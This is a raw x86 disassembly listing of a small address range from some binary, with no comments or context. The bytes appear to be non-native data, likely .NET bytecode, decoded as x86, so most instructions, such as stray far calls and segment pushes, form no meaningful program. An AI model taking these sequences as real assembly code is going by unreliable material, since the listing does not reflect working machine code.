  402cb3:	add    ch,BYTE PTR [eax]
  402cb5:	xchg   esi,eax
  402cb6:	add    BYTE PTR [eax],al
  402cb8:	or     ch,BYTE PTR [edx]
  402cba:	push   ds
  402cbb:	add    bh,BYTE PTR [ebx+0x15]
  402cbe:	add    BYTE PTR [eax],al
  402cc0:	add    al,0x2a
  402cc2:	push   ds
  402cc3:	add    bh,BYTE PTR [ebx+0x18]
  402cc6:	add    BYTE PTR [eax],al
  402cc8:	add    al,0x2a
  402cca:	jp     0x402ccf
  402ccc:	add    bh,BYTE PTR [ebx+0x18]
  402ccf:	add    BYTE PTR [eax],al
  402cd1:	add    al,0x1b
  402cd3:	sub    BYTE PTR [edi+0x2d0a0000],dl
  402cd9:	push   cs
  402cda:	add    dl,BYTE PTR [edi*2+0x4000016]
  402ce1:	add    al,BYTE PTR [ebx]
  402ce3:	jge    0x402cfd
  402ce5:	add    BYTE PTR [eax],al
  402ce7:	add    al,0x2a
  402ce9:	push   ds
  402cea:	add    bh,BYTE PTR [ebx+0x19]
  402ced:	add    BYTE PTR [eax],al
  402cef:	add    al,0x2a
  402cf1:	add    BYTE PTR [eax],al
  402cf3:	add    BYTE PTR [ebx],al
  402cf5:	xor    BYTE PTR [ebx],al
  402cf7:	add    BYTE PTR [eax+eax*1+0x0],dh
  402cfb:	add    BYTE PTR [eax],al
  402cfd:	add    BYTE PTR [eax],al
  402cff:	add    BYTE PTR [ebx],al
  402d01:	add    bh,BYTE PTR [ebx+0x19]
  402d04:	add    BYTE PTR [eax],al
  402d06:	add    al,0x1b
  402d08:	sub    BYTE PTR [edi+0x2d0a0000],dl
  402d0e:	add    dl,BYTE PTR fs:[edi*2+0x4000016]
  402d16:	add    al,BYTE PTR [ebx]
  402d18:	jge    0x402d33
  402d1a:	add    BYTE PTR [eax],al
  402d1c:	add    al,0x2
  402d1e:	jnp    0x402d39
  402d20:	add    BYTE PTR [eax],al
  402d22:	add    al,0x28
  402d24:	cwde   
  402d25:	add    BYTE PTR [eax],al
  402d27:	or     ch,BYTE PTR ds:0x197b0242
  402d2d:	add    BYTE PTR [eax],al
  402d2f:	add    al,0x72
  402d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d32:	add    al,BYTE PTR [eax]
  402d34:	jo     0x402d50
  402d36:	outs   dx,DWORD PTR ds:[esi]
  402d37:	cdq    
  402d38:	add    BYTE PTR [eax],al
  402d3a:	or     ch,BYTE PTR ds:0x7b250218
  402d40:	sbb    DWORD PTR [eax],eax
  402d42:	add    BYTE PTR [edi+ebx*1],al
  402d45:	pop    esp
  402d46:	mov    WORD PTR [esi+0x28010000],ds
  402d4c:	call   0x19:0x7d0a0000
  402d53:	add    BYTE PTR [edx+eax*1],al
  402d56:	add    bh,BYTE PTR [ebx+0x19]
  402d59:	add    BYTE PTR [eax],al
  402d5b:	add    al,0x72
  402d5d:	cli    
  402d5e:	add    al,BYTE PTR [eax]
  402d60:	jo     0x402d8a
  402d62:	and    eax,DWORD PTR [eax]
  402d64:	add    BYTE PTR [edx],cl
  402d66:	jge    0x402d82
  402d68:	add    BYTE PTR [eax],al
  402d6a:	add    al,0x2a
  402d6c:	add    dl,BYTE PTR [edi*2+0x400001a]
  402d73:	sub    bl,BYTE PTR [esi]
  402d75:	add    bh,BYTE PTR [ebx+0x16]
  402d78:	add    BYTE PTR [eax],al
  402d7a:	add    al,0x2a
  402d7c:	push   ds
  402d7d:	add    bh,BYTE PTR [ebx+0x17]
  402d80:	add    BYTE PTR [eax],al
  402d82:	add    al,0x2a
  402d84:	push   ds
  402d85:	add    bh,BYTE PTR [ebx+0x1c]
  402d88:	add    BYTE PTR [eax],al
  402d8a:	add    al,0x2a
  402d8c:	and    al,BYTE PTR [edx]
  402d8e:	add    edi,DWORD PTR [ebp+0x1c]
  402d91:	add    BYTE PTR [eax],al
  402d93:	add    al,0x2a
  402d95:	add    BYTE PTR [eax],al
  402d97:	add    BYTE PTR [ebx],bl
  402d99:	xor    BYTE PTR [edx],al
  402d9b:	add    BYTE PTR [ebp+0x0],cl
  402d9e:	add    BYTE PTR [eax],al
  402da0:	sldt   WORD PTR [eax]
  402da3:	adc    DWORD PTR [edx],eax
  402da5:	add    esi,DWORD PTR [ebx-0x65]
  402da8:	add    BYTE PTR [eax],al
  402daa:	or     bh,BYTE PTR [ebp+0x15]
  402dad:	add    BYTE PTR [eax],al
  402daf:	add    al,0x2
  402db1:	add    al,0x28
  402db3:	das    
  402db4:	add    BYTE PTR [eax],al
  402db6:	push   es
  402db7:	add    al,BYTE PTR ds:0x3128
  402dbd:	push   es
  402dbe:	push   ss
  402dbf:	or     bh,BYTE PTR [esi+0x3]
  402dc2:	add    BYTE PTR [eax],al
  402dc4:	add    al,0x25
  402dc6:	or     edx,DWORD PTR [edx]
  402dc8:	add    BYTE PTR [eax],ch
  402dca:	pushf  
  402dcb:	add    BYTE PTR [eax],al
  402dcd:	or     bh,BYTE PTR [esi+0x1b]
  402dd0:	add    BYTE PTR [eax],al
  402dd2:	add    al,0x2d
  402dd4:	movaps xmm4,XMMWORD PTR [ecx]
  402dd7:	add    BYTE PTR [eax],al
  402dd9:	or     dh,BYTE PTR [ebx-0x63]
  402ddc:	add    BYTE PTR [eax],al
  402dde:	or     al,BYTE PTR [eax+0x400001b]
  402de4:	fimul  WORD PTR [edx]
  402de6:	push   es
  402de7:	sub    al,0x6
  402de9:	pop    es
  402dea:	sub    BYTE PTR [esi-0x23f60000],bl
  402df0:	sub    al,BYTE PTR [eax]
  402df2:	add    BYTE PTR [eax],al
  402df4:	add    DWORD PTR [eax],edx
  402df6:	add    BYTE PTR [eax],al
  402df8:	add    al,BYTE PTR [eax]
  402dfa:	sbb    al,0x0
  402dfc:	es inc edx
  402dfe:	add    BYTE PTR [edx],cl
  402e00:	add    BYTE PTR [eax],al
  402e02:	add    BYTE PTR [eax],al
  402e04:	add    esi,DWORD PTR [eax]
  402e06:	add    al,0x0
  402e08:	data16 add BYTE PTR [eax],al
  402e0b:	add    BYTE PTR [eax],al
  402e0d:	add    BYTE PTR [eax],al
  402e0f:	add    BYTE PTR [edx],al
  402e11:	add    ebp,DWORD PTR [edi+0x2d]
  402e14:	add    BYTE PTR [eax],al
  402e16:	push   es
  402e17:	outs   dx,DWORD PTR ds:[esi]
  402e18:	lahf   
  402e19:	add    BYTE PTR [eax],al
  402e1b:	or     al,BYTE PTR [ebx]
  402e1d:	outs   dx,DWORD PTR ds:[esi]
  402e1e:	add    BYTE PTR cs:[eax],al
  402e21:	push   es
  402e22:	add    ebp,DWORD PTR [edi+0x30]
  402e25:	add    BYTE PTR [eax],al
  402e27:	push   es
  402e28:	sub    BYTE PTR [esi],dh
  402e2a:	add    BYTE PTR [eax],al
  402e2c:	push   es
  402e2d:	add    ebp,DWORD PTR [edi+0x32]
  402e30:	add    BYTE PTR [eax],al
  402e32:	push   es
  402e33:	sub    al,0x16
  402e35:	add    al,BYTE PTR [ebx]
  402e37:	outs   dx,DWORD PTR ds:[esi]
  402e38:	xor    al,BYTE PTR [eax]
  402e3a:	add    BYTE PTR [esi],al
  402e3c:	sub    BYTE PTR [ecx],ah
  402e3e:	add    BYTE PTR [eax],al
  402e40:	or     dh,BYTE PTR [ebx-0x60]
  402e43:	add    BYTE PTR [eax],al
  402e45:	or     bh,BYTE PTR [ebp+0x16]
  402e48:	add    BYTE PTR [eax],al
  402e4a:	add    al,0x3
  402e4c:	outs   dx,DWORD PTR ds:[esi]
  402e4d:	xor    eax,DWORD PTR [eax]
  402e4f:	add    BYTE PTR [esi],al
  402e51:	sub    al,0x16
  402e53:	add    al,BYTE PTR [ebx]
  402e55:	outs   dx,DWORD PTR ds:[esi]
  402e56:	xor    eax,DWORD PTR [eax]
  402e58:	add    BYTE PTR [esi],al
  402e5a:	sub    BYTE PTR [ecx],ah
  402e5c:	add    BYTE PTR [eax],al
  402e5e:	or     dh,BYTE PTR [ebx-0x60]
  402e61:	add    BYTE PTR [eax],al
  402e63:	or     bh,BYTE PTR [ebp+0x17]
  402e66:	add    BYTE PTR [eax],al
  402e68:	add    al,0x2
  402e6a:	add    ebp,DWORD PTR [edi+0x34]
  402e6d:	add    BYTE PTR [eax],al
  402e6f:	push   es
  402e70:	sub    BYTE PTR ds:0x2a060000,dh
  402e76:	add    BYTE PTR [eax],al
  402e78:	adc    esi,DWORD PTR [eax]
  402e7a:	add    al,BYTE PTR [eax]
  402e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7d:	add    BYTE PTR [eax],al
  402e7f:	add    BYTE PTR [eax],dl
  402e81:	add    BYTE PTR [eax],al
  402e83:	adc    DWORD PTR [ebx],eax
  402e85:	outs   dx,DWORD PTR ds:[esi]
  402e86:	mov    eax,ds:0xa0a0000
  402e8b:	adc    al,BYTE PTR [eax]
  402e8d:	ror    BYTE PTR [eax+eax*1],1
  402e90:	add    BYTE PTR [ecx],al
  402e92:	sub    BYTE PTR [esi+0x0],al
  402e95:	add    BYTE PTR [edx],cl
  402e97:	outs   dx,DWORD PTR ds:[esi]
  402e98:	mov    eax,ds:0x280a0000
  402e9d:	mov    ds:0x2c0a0000,al
  402ea2:	add    al,BYTE PTR [edx]
  402ea4:	sub    al,BYTE PTR [ebx]
  402ea6:	outs   dx,DWORD PTR ds:[esi]
  402ea7:	mov    eax,ds:0xb0a0000
  402eac:	adc    al,BYTE PTR [ecx]
  402eae:	ror    BYTE PTR [edx],1
  402eb0:	add    BYTE PTR [eax],al
  402eb2:	add    DWORD PTR [eax],ebp
  402eb4:	inc    esi
  402eb5:	add    BYTE PTR [eax],al
  402eb7:	or     ch,BYTE PTR [edi-0x5f]
  402eba:	add    BYTE PTR [eax],al
  402ebc:	or     ch,BYTE PTR [eax]
  402ebe:	mov    ds:0x2d0a0000,al
  402ec3:	pop    ds
  402ec4:	add    ebp,DWORD PTR [edi-0x5f]
  402ec7:	add    BYTE PTR [eax],al
  402ec9:	or     cl,BYTE PTR [edx+edx*1]
  402ecc:	add    dl,al
  402ece:	mov    al,ds:0x28010000
  402ed3:	inc    esi
  402ed4:	add    BYTE PTR [eax],al
  402ed6:	or     ch,BYTE PTR [edi-0x5f]
  402ed9:	add    BYTE PTR [eax],al
  402edb:	or     ch,BYTE PTR [eax]
  402edd:	mov    ds:0x2c0a0000,al
  402ee2:	add    al,BYTE PTR [edx]
  402ee4:	sub    al,BYTE PTR [ebx]
  402ee6:	outs   dx,DWORD PTR ds:[esi]
  402ee7:	mov    eax,ds:0xd0a0000
  402eec:	adc    al,BYTE PTR [ebx]
  402eee:	ror    BYTE PTR ds:0x28010000,1
  402ef4:	inc    esi
  402ef5:	add    BYTE PTR [eax],al
  402ef7:	or     ch,BYTE PTR [edi-0x5f]
  402efa:	add    BYTE PTR [eax],al
  402efc:	or     ch,BYTE PTR [eax]
  402efe:	mov    ds:0x2c0a0000,al
  402f03:	add    al,BYTE PTR [edx]
  402f05:	sub    al,BYTE PTR [ebx]
  402f07:	outs   dx,DWORD PTR ds:[esi]
  402f08:	mov    eax,ds:0x130a0000
  402f0d:	add    al,0x12
  402f0f:	add    al,0xd0
  402f11:	push   cs
  402f12:	add    BYTE PTR [eax],al
  402f14:	add    DWORD PTR [eax],ebp
  402f16:	inc    esi
  402f17:	add    BYTE PTR [eax],al
  402f19:	or     ch,BYTE PTR [edi-0x5f]
  402f1c:	add    BYTE PTR [eax],al
  402f1e:	or     ch,BYTE PTR [eax]
  402f20:	mov    ds:0x2c0a0000,al
  402f25:	add    al,BYTE PTR [edx]
  402f27:	sub    dl,BYTE PTR [edx+ebp*1]
  402f2a:	add    BYTE PTR [eax],al
  402f2c:	adc    esi,DWORD PTR [eax]
  402f2e:	add    al,BYTE PTR [eax]
  402f30:	aas    
  402f31:	add    BYTE PTR [eax],al
  402f33:	add    BYTE PTR [ecx],dl
  402f35:	add    BYTE PTR [eax],al
  402f37:	adc    DWORD PTR [edx+ecx*1],edx
  402f3a:	add    al,0x28
  402f3c:	cwde   
  402f3d:	add    BYTE PTR [eax],al
  402f3f:	or     ch,BYTE PTR [esp+ebx*1]
  402f42:	add    al,BYTE PTR [ebx]
  402f44:	outs   dx,DWORD PTR ds:[esi]
  402f45:	mov    ds:0x280a0000,eax
  402f4a:	inc    ebx
  402f4b:	add    BYTE PTR [eax],al
  402f4d:	push   es
  402f4e:	or     eax,DWORD PTR [edx]
  402f50:	pop    es
  402f51:	sub    BYTE PTR [eax+eax*1+0x41280a00],ah
  402f58:	add    BYTE PTR [eax],al
  402f5a:	push   es
  402f5b:	or     ch,BYTE PTR [ebx]
  402f5d:	or     eax,0xa4280402
  402f62:	add    BYTE PTR [eax],al
  402f64:	or     ch,BYTE PTR [eax]
  402f66:	inc    ecx
  402f67:	add    BYTE PTR [eax],al
  402f69:	push   es
  402f6a:	or     al,BYTE PTR [esi]
  402f6c:	sub    BYTE PTR [eax+0x2d0a0000],bl
  402f72:	add    al,BYTE PTR [esi]
  402f74:	sub    al,BYTE PTR [edx+ebp*1]
  402f77:	push   ds
  402f78:	add    ebp,DWORD PTR [eax]
  402f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f7b:	add    BYTE PTR [eax],al
  402f7d:	or     ch,BYTE PTR [edx]
  402f7f:	add    eax,DWORD PTR ds:[edx]
  402f82:	jnp    0x402f99
  402f84:	add    BYTE PTR [eax],al
  402f86:	add    al,0x6f
  402f88:	lahf   
  402f89:	add    BYTE PTR [eax],al
  402f8b:	or     dl,BYTE PTR [ecx+0x16]
  402f8e:	sub    dh,BYTE PTR [esi]
  402f90:	add    al,BYTE PTR [ebx]
  402f92:	add    al,0x17
  402f94:	add    eax,0x3d28040e
  402f99:	add    BYTE PTR [eax],al
  402f9b:	push   es
  402f9c:	sub    al,BYTE PTR [eax]
  402f9e:	add    BYTE PTR [eax],al
  402fa0:	adc    esi,DWORD PTR [eax]
  402fa2:	add    eax,DWORD PTR [eax]
  402fa4:	push   0x0
  402fa6:	add    BYTE PTR [eax],al
  402fa8:	adc    al,BYTE PTR [eax]
  402faa:	add    BYTE PTR [ecx],dl
  402fac:	push   ss
  402fad:	or     cl,BYTE PTR [esi]
  402faf:	add    eax,0xb165416
  402fb4:	sub    edx,DWORD PTR [edx+eax*1+0x3]
  402fb8:	pop    es
  402fb9:	call   0xc06:0x4328
  402fc0:	or     BYTE PTR [eax],ch
  402fc2:	cwde   
  402fc3:	add    BYTE PTR [eax],al
  402fc5:	or     ch,BYTE PTR ds:0x703023e
  402fcb:	call   0x600:0x3e2808
  402fd2:	or     eax,0x982809
  402fd7:	add    BYTE PTR [edx],cl
  402fd9:	sub    eax,0xe040e2b
  402fde:	add    eax,0x328fe04b
  402fe3:	add    BYTE PTR [eax],al
  402fe5:	add    DWORD PTR [ebx],eax
  402fe7:	pop    es
  402fe8:	call   0xe0a:0xa67d
  402fef:	add    al,0xe
  402ff1:	add    eax,0x328fe04b
  402ff6:	add    BYTE PTR [eax],al
  402ff8:	add    DWORD PTR [ecx],ecx
  402ffa:	jge    0x402fa3
  402ffc:	add    BYTE PTR [eax],al
  402ffe:	or     cl,BYTE PTR [esi]
  403000:	add    eax,0x58174b25
  403005:	push   esp
  403006:	pop    es
  403007:	pop    ss
  403008:	pop    eax
  403009:	or     eax,DWORD PTR [edi]
  40300b:	add    edx,DWORD PTR [esi]
  40300d:	outs   dx,DWORD PTR ds:[esi]
  40300e:	test   al,0x0
  403010:	add    BYTE PTR [edx],cl
  403012:	xor    ah,BYTE PTR [edx+0x2a06]
  403018:	adc    esi,DWORD PTR [eax]
  40301a:	add    al,0x0
  40301c:	or     eax,DWORD PTR [eax]
  40301e:	add    BYTE PTR [eax],al
  403020:	adc    eax,DWORD PTR [eax]
  403022:	add    BYTE PTR [ecx],dl
  403024:	add    al,BYTE PTR [ebx]
  403026:	add    al,0x12
  403028:	add    BYTE PTR [eax],ch
  40302a:	aas    
  40302b:	add    BYTE PTR [eax],al
  40302d:	push   es
  40302e:	sub    al,BYTE PTR [eax]
  403030:	adc    esi,DWORD PTR [eax]
  403032:	add    eax,DWORD PTR [eax]
  403034:	sub    al,BYTE PTR [eax]
  403036:	add    BYTE PTR [eax],al
  403038:	push   cs
  403039:	add    BYTE PTR [eax],al
  40303b:	adc    DWORD PTR ds:0x4025417,eax
  403041:	sub    BYTE PTR [eax+0x0],al
  403044:	add    BYTE PTR [esi],al
  403046:	or     al,BYTE PTR [esi]
  403048:	sub    eax,0x5418050b
  40304d:	add    al,BYTE PTR [eax+ebp*1]
  403050:	inc    ecx
  403051:	add    BYTE PTR [eax],al
  403053:	push   es
  403054:	or     al,BYTE PTR [esi]
  403056:	sub    eax,0x5416050c
  40305b:	add    al,BYTE PTR [ebx]
  40305d:	add    al,0x28
  40305f:	inc    edx
  403060:	add    BYTE PTR [eax],al
  403062:	push   es
  403063:	or     al,BYTE PTR [esi]
  403065:	sub    al,BYTE PTR [eax]
  403067:	add    BYTE PTR [ebx],bl
  403069:	xor    BYTE PTR [ebx],al
  40306b:	add    BYTE PTR [ebx+0x14000000],bh
  403071:	add    BYTE PTR [eax],al
  403073:	adc    DWORD PTR [edx+ecx*1],edx
  403076:	push   ss
  403077:	adc    eax,DWORD PTR ds:0x1b7e
  40307d:	add    al,0x25
  40307f:	adc    eax,DWORD PTR [esi]
  403081:	adc    al,BYTE PTR ds:0x9c28
  403087:	or     bh,BYTE PTR [esi+0x1b]
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    al,0x2
  40308e:	jnp    0x4030a5
  403090:	add    BYTE PTR [eax],al
  403092:	add    al,0x6f
  403094:	lahf   
  403095:	add    BYTE PTR [eax],al
  403097:	or     dl,BYTE PTR [edx]
  403099:	add    DWORD PTR [edi-0x57],ebp
  40309c:	add    BYTE PTR [eax],al
  40309e:	or     ah,BYTE PTR [esi]
  4030a0:	pop    es
  4030a1:	sub    eax,0x21286d
  4030a6:	add    BYTE PTR [edx],cl
  4030a8:	jae    0x403054
  4030aa:	add    BYTE PTR [eax],al
  4030ac:	or     cl,BYTE PTR [ebx]
  4030ae:	jae    0x4030d2
  4030b0:	add    BYTE PTR [eax],al
  4030b2:	push   es
  4030b3:	or     al,0x8
  4030b5:	add    bh,BYTE PTR [ebx+0x15]
  4030b8:	add    BYTE PTR [eax],al
  4030ba:	add    al,0x6f
  4030bc:	and    eax,DWORD PTR [eax]
  4030be:	add    BYTE PTR [esi],al
  4030c0:	or     eax,0x816f09
  4030c5:	add    BYTE PTR [edx],cl
  4030c7:	adc    eax,DWORD PTR [edi]
  4030c9:	sub    ebx,DWORD PTR [eax]
  4030cb:	adc    DWORD PTR [edi],eax
  4030cd:	outs   dx,DWORD PTR ds:[esi]
  4030ce:	add    BYTE PTR [eax],0x0
  4030d1:	or     dl,BYTE PTR [ebx]
  4030d3:	add    al,0x7
  4030d5:	adc    DWORD PTR [eax+ebp*1],eax
  4030d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030d9:	add    BYTE PTR [eax],al
  4030db:	or     dl,BYTE PTR [ecx]
  4030dd:	add    al,0x6f
  4030df:	stos   DWORD PTR es:[edi],eax
  4030e0:	add    BYTE PTR [eax],al
  4030e2:	or     dl,BYTE PTR [ecx]
  4030e4:	pop    es
  4030e5:	outs   dx,DWORD PTR ds:[esi]
  4030e6:	test   BYTE PTR [eax],al
  4030e8:	add    BYTE PTR [edx],cl
  4030ea:	sub    eax,0x110cdedf
  4030ef:	pop    es
  4030f0:	sub    al,0x7
  4030f2:	adc    DWORD PTR [edi],eax
  4030f4:	outs   dx,DWORD PTR ds:[esi]
  4030f5:	inc    ebx
  4030f6:	add    BYTE PTR [eax],al
  4030f8:	or     bl,ah
  4030fa:	jle    0x403117
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	add    al,0x2
  403100:	jnp    0x403117
  403102:	add    BYTE PTR [eax],al
  403104:	add    al,0x6f
  403106:	lahf   
  403107:	add    BYTE PTR [eax],al
  403109:	or     al,BYTE PTR [edi]
  40310b:	outs   dx,DWORD PTR ds:[esi]
  40310c:	lods   al,BYTE PTR ds:[esi]
  40310d:	add    BYTE PTR [eax],al
  40310f:	or     al,BYTE PTR [edi]
  403111:	add    ebp,DWORD PTR [eax]
  403113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403114:	add    BYTE PTR [eax],al
  403116:	or     dl,BYTE PTR [edx]
  403118:	add    BYTE PTR [edi-0x53],ch
  40311b:	add    BYTE PTR [eax],al
  40311d:	or     ah,BYTE PTR [esi]
  40311f:	fimul  WORD PTR [ecx+edx*1]
  403122:	add    eax,0x611072c
  403127:	sub    BYTE PTR [esi-0x23f60000],bl
  40312d:	push   es
  40312e:	sub    al,BYTE PTR [eax]
  403130:	add    DWORD PTR [eax+eax*1],ebx
  403133:	add    BYTE PTR [edx],al
  403135:	add    BYTE PTR [ebp+0x0],dl
  403138:	and    eax,0xc007a
  40313d:	add    BYTE PTR [eax],al
  40313f:	add    BYTE PTR [edx],al
  403141:	add    BYTE PTR ds:0xada800,al
  403147:	or     al,0x0
  403149:	add    BYTE PTR [eax],al
  40314b:	add    BYTE PTR [ebx],dl
  40314d:	xor    BYTE PTR [ebx],al
  40314f:	add    BYTE PTR [eax],ah
  403151:	add    BYTE PTR [eax],al
  403153:	add    BYTE PTR [esi],cl
  403155:	add    BYTE PTR [eax],al
  403157:	adc    DWORD PTR [edx+ecx*1],edx
  40315a:	add    bh,BYTE PTR [ebx+0x16]
  40315d:	add    BYTE PTR [eax],al
  40315f:	add    al,0x2c
  403161:	adc    al,0x2
  403163:	jnp    0x40317b
  403165:	add    BYTE PTR [eax],al
  403167:	add    al,0x3
  403169:	sub    BYTE PTR [eax+eax*1+0x120a00],ah
  403170:	outs   dx,DWORD PTR ds:[esi]
  403171:	lods   eax,DWORD PTR ds:[esi]
  403172:	add    BYTE PTR [eax],al
  403174:	or     ah,BYTE PTR [esi]
  403176:	push   es
  403177:	sub    bl,BYTE PTR [ebx]
  403179:	xor    BYTE PTR [ebx],al
  40317b:	add    BYTE PTR [ecx+0x0],dh
  40317e:	add    BYTE PTR [eax],al
  403180:	adc    eax,0x14110000
  403185:	or     al,BYTE PTR [edx]
  403187:	jnp    0x4031a0
  403189:	add    BYTE PTR [eax],al
  40318b:	add    al,0x2c
  40318d:	add    bh,BYTE PTR gs:[ebx+0x17]
  403191:	add    BYTE PTR [eax],al
  403193:	add    al,0x3
  403195:	adc    al,BYTE PTR [eax]
  403197:	outs   dx,DWORD PTR ds:[esi]
  403198:	lods   eax,DWORD PTR ds:[esi]
  403199:	add    BYTE PTR [eax],al
  40319b:	or     ch,BYTE PTR ds:0xa4280455
  4031a1:	add    BYTE PTR [eax],al
  4031a3:	or     cl,BYTE PTR [ebx]
  4031a5:	add    bh,BYTE PTR [ebx+0x17]
  4031a8:	add    BYTE PTR [eax],al
  4031aa:	add    al,0x6f
  4031ac:	scas   al,BYTE PTR es:[edi]
  4031ad:	add    BYTE PTR [eax],al
  4031af:	or     cl,BYTE PTR ds:0x312272b
  4031b5:	sub    BYTE PTR [edi+0xc0a0000],ch
  4031bb:	pop    es
  4031bc:	adc    al,BYTE PTR [edx]
  4031be:	sub    BYTE PTR [eax+0x280a0000],dh
  4031c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031c5:	add    BYTE PTR [eax],al
  4031c7:	or     bl,BYTE PTR [ebx]
  4031c9:	sub    BYTE PTR [edi+0x2c0a0000],dl
  4031cf:	or     dl,BYTE PTR [edx]
  4031d1:	add    ch,BYTE PTR [eax]
  4031d3:	mov    al,0x0
  4031d5:	add    BYTE PTR [edx],cl
  4031d7:	or     ch,BYTE PTR [ebx]
  4031d9:	or     DWORD PTR [edx],edx
  4031db:	add    ebp,DWORD PTR [eax]
  4031dd:	mov    cl,0x0
  4031df:	add    BYTE PTR [edx],cl
  4031e1:	sub    eax,0x120eded0
  4031e6:	add    edi,esi
  4031e8:	push   ss
  4031e9:	push   cs
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	sbb    ebp,DWORD PTR [edi+0x43]
  4031ef:	add    BYTE PTR [eax],al
  4031f1:	or     bl,ah
  4031f3:	push   es
  4031f4:	sub    al,BYTE PTR [eax]
  4031f6:	add    BYTE PTR [eax],al
  4031f8:	add    DWORD PTR [eax],edx
  4031fa:	add    BYTE PTR [eax],al
  4031fc:	add    al,BYTE PTR [eax]
  4031fe:	sub    eax,0x613400
  403203:	push   cs
  403204:	add    BYTE PTR [eax],al
  403206:	add    BYTE PTR [eax],al
  403208:	sbb    esi,DWORD PTR [eax]
  40320a:	add    al,0x0
  40320c:	push   0x0
  40320e:	add    BYTE PTR [eax],al
  403210:	push   ss
  403211:	add    BYTE PTR [eax],al
  403213:	adc    DWORD PTR [edx+ecx*1],edx
  403216:	add    ebp,DWORD PTR [eax]
  403218:	mov    dl,0x0
  40321a:	add    BYTE PTR [edx],cl
  40321c:	sub    eax,0xb672030e
  403221:	add    al,BYTE PTR [eax]
  403223:	jo     0x403240
  403225:	outs   dx,DWORD PTR ds:[esi]
  403226:	cdq    
  403227:	add    BYTE PTR [eax],al
  403229:	or     ch,BYTE PTR [edi+eax*1]
  40322c:	add    ebp,DWORD PTR [eax]
  40322e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322f:	add    BYTE PTR [eax],al
  403231:	or     cl,BYTE PTR [edx]
  403233:	fiadd  WORD PTR [ebx]
  403235:	fiadd  WORD PTR es:[eax]
  403238:	push   es
  403239:	sub    eax,0x8d170341
  40323e:	sahf   
  40323f:	add    BYTE PTR [eax],al
  403241:	add    DWORD PTR [eax+ecx*1],ecx
  403244:	push   ss
  403245:	pop    ds
  403246:	sub    al,0x9d
  403248:	or     BYTE PTR [edi-0x4d],ch
  40324b:	add    BYTE PTR [eax],al
  40324d:	or     cl,BYTE PTR [ebx]
  40324f:	pop    es
  403250:	push   ss
  403251:	outs   dx,DWORD PTR ds:[esi]
  403252:	test   al,0x0
  403254:	add    BYTE PTR [edx],cl
  403256:	push   ss
  403257:	xor    DWORD PTR [ebx],esp
  403259:	pop    es
  40325a:	push   ss
  40325b:	call   0xa0a:0xb46f
  403262:	push   es
  403263:	jb     0x40321b
  403265:	add    al,BYTE PTR [eax]
  403267:	jo     0x403284
  403269:	outs   dx,DWORD PTR ds:[esi]
  40326a:	cdq    
  40326b:	add    BYTE PTR [eax],al
  40326d:	or     ch,BYTE PTR ds:0xb672060c
  403273:	add    al,BYTE PTR [eax]
  403275:	jo     0x40329f
  403277:	and    eax,DWORD PTR [eax]
  403279:	add    BYTE PTR [edx],cl
  40327b:	or     al,BYTE PTR [esi]
  40327d:	sub    al,BYTE PTR [eax]
  40327f:	add    BYTE PTR [ecx],al
  403281:	adc    BYTE PTR [eax],al
  403283:	add    BYTE PTR [eax],al
  403285:	add    BYTE PTR [edx],al
  403287:	add    BYTE PTR [edi],bl
  403289:	and    DWORD PTR [eax],eax
  40328b:	add    esp,DWORD PTR [eax+eax*1+0x30130100]
  403292:	add    eax,DWORD PTR [eax]
  403294:	and    al,BYTE PTR [eax]
  403296:	add    BYTE PTR [eax],al
  403298:	adc    DWORD PTR [eax],eax
  40329a:	add    BYTE PTR [ecx],dl
  40329c:	adc    al,0xa
  40329e:	add    al,BYTE PTR [eax+ebp*1]
  4032a1:	inc    ebx
  4032a2:	add    BYTE PTR [eax],al
  4032a4:	push   es
  4032a5:	or     eax,DWORD PTR [edi]
  4032a7:	sub    al,0x8
  4032a9:	add    al,BYTE PTR [edi]
  4032ab:	sub    BYTE PTR [eax+0x0],al
  4032ae:	add    BYTE PTR [esi],al
  4032b0:	or     al,BYTE PTR ds:0x982806
  4032b6:	add    BYTE PTR [edx],cl
  4032b8:	push   ss
  4032b9:	inc    BYTE PTR [ecx]
  4032bb:	push   edx
  4032bc:	push   ss
  4032bd:	sub    al,BYTE PTR [eax]
  4032bf:	add    BYTE PTR [ebx],dl
  4032c1:	xor    BYTE PTR [eax+eax*1],al
  4032c4:	sub    DWORD PTR [eax],eax
  4032c6:	add    BYTE PTR [eax],al
  4032c8:	push   cs
  4032c9:	add    BYTE PTR [eax],al
  4032cb:	adc    DWORD PTR ds:0x4025114,eax
  4032d1:	sub    BYTE PTR [ebx+0x0],al
  4032d4:	add    BYTE PTR [esi],al
  4032d6:	or     al,BYTE PTR [esi]
  4032d8:	sub    al,0xa
  4032da:	add    eax,0x28060402
  4032df:	add    BYTE PTR ds:[eax],al
  4032e2:	push   es
  4032e3:	push   ecx
  4032e4:	add    eax,0x982850
  4032e9:	add    BYTE PTR [edx],cl
  4032eb:	sub    eax,0x202a1602
  4032f0:	add    eax,0x2a800040
  4032f5:	add    BYTE PTR [eax],al
  4032f7:	add    BYTE PTR [ebx],dl
  4032f9:	xor    BYTE PTR ds:0x2f00,al
  4032ff:	add    BYTE PTR [esi],cl
  403301:	add    BYTE PTR [eax],al
  403303:	adc    DWORD PTR [esi],ecx
  403305:	add    al,0x16
  403307:	push   esp
  403308:	add    eax,0x4025114
  40330d:	sub    BYTE PTR [ebx+0x0],al
  403310:	add    BYTE PTR [esi],al
  403312:	or     al,BYTE PTR [esi]
  403314:	sub    al,0xc
  403316:	add    eax,0xe060402
  40331b:	add    al,0x28
  40331d:	aas    
  40331e:	add    BYTE PTR [eax],al
  403320:	push   es
  403321:	push   ecx
  403322:	add    eax,0x982850
  403327:	add    BYTE PTR [edx],cl
  403329:	sub    eax,0x202a1602
  40332e:	add    eax,0x2a800040
  403333:	sub    al,BYTE PTR [ebx]
  403335:	add    bh,BYTE PTR [ebx+0x18]
  403338:	add    BYTE PTR [eax],al
  40333a:	add    al,0x51
  40333c:	push   ss
  40333d:	sub    al,BYTE PTR [eax]
